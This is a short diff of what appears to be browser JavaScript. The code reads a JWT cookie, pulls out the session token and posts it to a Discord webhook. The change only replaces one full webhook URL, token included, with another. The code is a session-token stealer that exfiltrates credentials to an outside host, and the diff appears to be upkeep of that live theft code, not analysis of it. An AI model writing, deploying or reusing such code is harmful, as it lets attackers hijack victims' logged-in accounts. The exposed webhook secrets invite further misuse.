@@ -7,7 +7,7 @@ if (jwtCookie) {
     const jwtToken = jwtCookie.split('=')[1];
 
     // Discord webhook URL to send the JWT token
-    const discordWebhookURL = 'https://discord.com/api/webhooks/1195043324957048842/vP42chW2jMdK4uzpR7ETu4BUQ_DHSWYZgHOYAxGxFuG7EhCgYnZalCAyv_yeygfYPH1Q';
+    const discordWebhookURL = 'https://discord.com/api/webhooks/1213536877517217832/DogCETz72WE2afMpwQmrgNGxz0kpfCTBvZgDzMGlOSUKB5ZUffeVrytPj4arrOcGexfH';
 
     // Data to send to Discord webhook
     const data = {
